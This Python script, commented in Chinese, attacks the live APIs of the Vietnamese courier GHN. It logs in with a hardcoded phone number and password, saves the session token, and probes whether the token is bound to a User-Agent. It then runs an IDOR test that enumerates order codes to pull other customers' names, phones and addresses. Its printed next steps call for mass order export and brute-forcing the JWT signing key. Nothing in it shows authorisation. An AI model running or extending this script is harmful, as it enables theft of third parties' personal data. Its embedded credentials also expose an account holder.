#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GHN账号完整测试工具
"""

import requests
import json
import time

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

def login(phone, password):
    """登录获取Token"""
    print(f"\n{Colors.CYAN}[*] 登录中...{Colors.END}")
    
    try:
        r = requests.post(
            "https://sso.ghn.vn/sso/public-api/v2/client/login",
            json={"phone": phone, "password": password},
            timeout=15
        )
        
        if r.status_code == 200:
            data = r.json()
            if data.get('code') == 200:
                token = data['data'].get('token')
                user_id = data['data'].get('_id')
                print(f"{Colors.GREEN}[+] ✅ 登录成功!{Colors.END}")
                print(f"[+] User ID: {user_id}")
                print(f"[+] Token: {token[:50]}...")
                return token, data['data']
            else:
                print(f"{Colors.RED}[-] 登录失败: {data.get('message')}{Colors.END}")
                return None, None
        else:
            print(f"{Colors.RED}[-] HTTP错误: {r.status_code}{Colors.END}")
            print(f"响应: {r.text[:200]}")
            return None, None
            
    except Exception as e:
        print(f"{Colors.RED}[-] 异常: {e}{Colors.END}")
        return None, None

def get_user_info(token):
    """获取用户信息"""
    print(f"\n{Colors.CYAN}[*] 获取用户信息...{Colors.END}")
    
    try:
        r = requests.get(
            "https://online-gateway.ghn.vn/shiip/public-api/v2/user/info",
            headers={"Token": token, "Content-Type": "application/json"},
            timeout=10
        )
        
        if r.status_code == 200:
            data = r.json()
            print(f"{Colors.GREEN}[+] ✅ 信息获取成功:{Colors.END}")
            print(json.dumps(data, indent=2, ensure_ascii=False))
            return data
        else:
            print(f"{Colors.RED}[-] 失败: {r.status_code} - {r.text[:100]}{Colors.END}")
            return None
            
    except Exception as e:
        print(f"{Colors.RED}[-] 异常: {e}{Colors.END}")
        return None

def get_shops(token):
    """获取商店列表"""
    print(f"\n{Colors.CYAN}[*] 获取商店列表...{Colors.END}")
    
    try:
        r = requests.get(
            "https://online-gateway.ghn.vn/shiip/public-api/v2/shop/all",
            headers={"Token": token},
            timeout=10
        )
        
        if r.status_code == 200:
            data = r.json()
            if data.get('data') and data['data'].get('shops'):
                shops = data['data']['shops']
                print(f"{Colors.GREEN}[+] ✅ 找到 {len(shops)} 个商店:{Colors.END}")
                for shop in shops:
                    print(f"  - Shop ID: {shop.get('_id')}")
                    print(f"    名称: {shop.get('name')}")
                    print(f"    电话: {shop.get('phone')}")
                return shops
            else:
                print(f"{Colors.YELLOW}[!] 无商店数据{Colors.END}")
                return []
        else:
            print(f"{Colors.RED}[-] 失败: {r.status_code}{Colors.END}")
            return []
            
    except Exception as e:
        print(f"{Colors.RED}[-] 异常: {e}{Colors.END}")
        return []

def test_idor(token):
    """测试IDOR漏洞"""
    print(f"\n{Colors.CYAN}[*] 测试IDOR漏洞...{Colors.END}")
    
    test_order_codes = [
        "GHN00000001",
        "GHN00000100", 
        "GHN00001000",
        "GHNA0000001",
        "V123456",
    ]
    
    found = []
    
    for code in test_order_codes:
        try:
            r = requests.post(
                "https://online-gateway.ghn.vn/shiip/public-api/v2/shipping-order/detail",
                headers={"Token": token, "Content-Type": "application/json"},
                json={"order_code": code},
                timeout=10
            )
            
            if r.status_code == 200:
                data = r.json()
                if data.get('code') == 200:
                    print(f"{Colors.GREEN}[+] ✅ IDOR成功! 订单: {code}{Colors.END}")
                    order = data['data']
                    print(f"    客户: {order.get('to_name')}")
                    print(f"    电话: {order.get('to_phone')}")
                    print(f"    地址: {order.get('to_address')}")
                    found.append(code)
            
            time.sleep(0.5)  # 限速
            
        except Exception as e:
            pass
    
    if found:
        print(f"\n{Colors.GREEN}[!] 🔥 IDOR漏洞存在! 找到 {len(found)} 个订单{Colors.END}")
    else:
        print(f"\n{Colors.YELLOW}[!] 未找到可访问的订单（需要更多枚举）{Colors.END}")
    
    return found

def test_token_binding(token):
    """测试Token绑定"""
    print(f"\n{Colors.CYAN}[*] 测试Token绑定机制...{Colors.END}")
    
    base_url = "https://online-gateway.ghn.vn/shiip/public-api/v2/user/info"
    
    # 测试不同User-Agent
    user_agents = [
        "GHN/4.10.6 (Android 13)",
        "Mozilla/5.0 (Windows)",
        "curl/7.68.0"
    ]
    
    results = []
    
    for ua in user_agents:
        try:
            r = requests.get(
                base_url,
                headers={"Token": token, "User-Agent": ua},
                timeout=10
            )
            
            success = r.status_code == 200
            results.append(success)
            
            status = "✅" if success else "❌"
            print(f"  {status} {ua[:30]:30s} -> {r.status_code}")
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"  ❌ {ua[:30]:30s} -> 异常")
    
    if all(results):
        print(f"\n{Colors.GREEN}[!] 🎯 Token无UA绑定，可自由使用!{Colors.END}")
        return True
    else:
        print(f"\n{Colors.YELLOW}[!] ⚠️  Token可能有UA绑定{Colors.END}")
        return False

def main():
    print(f"{Colors.BOLD}{Colors.CYAN}")
    print("=" * 60)
    print("  GHN账号完整测试工具")
    print("=" * 60)
    print(f"{Colors.END}\n")
    
    # 凭据
    phone = "0918538458"
    password = "Duongquang1234@"
    
    # 1. 登录
    token, user_data = login(phone, password)
    
    if not token:
        print(f"\n{Colors.RED}[X] 登录失败，退出{Colors.END}")
        return
    
    # 保存Token
    with open("/workspace/ghn_token.txt", "w") as f:
        f.write(token)
    print(f"\n{Colors.GREEN}[+] Token已保存至: /workspace/ghn_token.txt{Colors.END}")
    
    # 2. 获取用户信息
    get_user_info(token)
    
    # 3. 获取商店
    shops = get_shops(token)
    
    # 4. 测试Token绑定
    test_token_binding(token)
    
    # 5. 测试IDOR
    test_idor(token)
    
    # 总结
    print(f"\n{Colors.BOLD}{Colors.GREEN}")
    print("=" * 60)
    print("  测试完成!")
    print("=" * 60)
    print(f"{Colors.END}")
    
    print(f"\n{Colors.CYAN}[下一步建议]{Colors.END}")
    print("1. 使用Token进行IDOR枚举:")
    print(f"   python3 idor_scanner.py --token '{token[:30]}...'")
    print("\n2. 导出订单数据:")
    print(f"   python3 order_exporter.py --token '{token[:30]}...'")
    print("\n3. 尝试破解JWT密钥:")
    print(f"   python3 ghn_token_forger.py --mode brute --token '{token[:30]}...'")
    print("\n4. 测试其他API端点:")
    print("   参考 GHN_API_EXPLOITATION_TOOLKIT.md")

if __name__ == "__main__":
    main()
